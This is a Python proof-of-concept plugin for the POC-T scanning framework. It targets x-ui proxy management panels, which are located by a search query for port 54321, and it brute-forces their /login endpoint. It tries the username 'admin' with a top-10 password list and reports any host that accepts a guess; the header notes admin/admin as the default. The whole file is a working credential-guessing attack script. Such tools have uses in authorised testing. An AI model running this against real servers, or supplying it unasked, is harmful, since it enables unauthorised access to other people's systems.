#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   ssr-xui_weak_pass.py.py
@DateTime :  2023/3/11 18:01
@Usage:
    python2 POC-T.py -s ssr-xui_weak_pass.py -aF "port=54321 && body='xui'"
    admin/admin
'''
import json

from lib.utils.http import request_ex, get_http_url, urljoin_ex
from lib.core.data import logger as log
from lib.utils.dic import Wordlist


def _is_valid_login(resp):
    if not resp:
        return False

    if "false" in resp.text:
        return False

    else:
        return True


def poc(url):
    url = get_http_url(url)
    login_url = urljoin_ex(url, "/login")

    for pwd in Wordlist.top_10_pass:
        poster = {
            "username": "admin",
            "password": pwd
        }
        resp = request_ex("post", login_url, json=poster, timeout=8)
        if _is_valid_login(resp):
            msg = "%s\t%s" % (url, json.dumps(poster))
            return msg
        else:
            continue

    # fail when finished
    return False
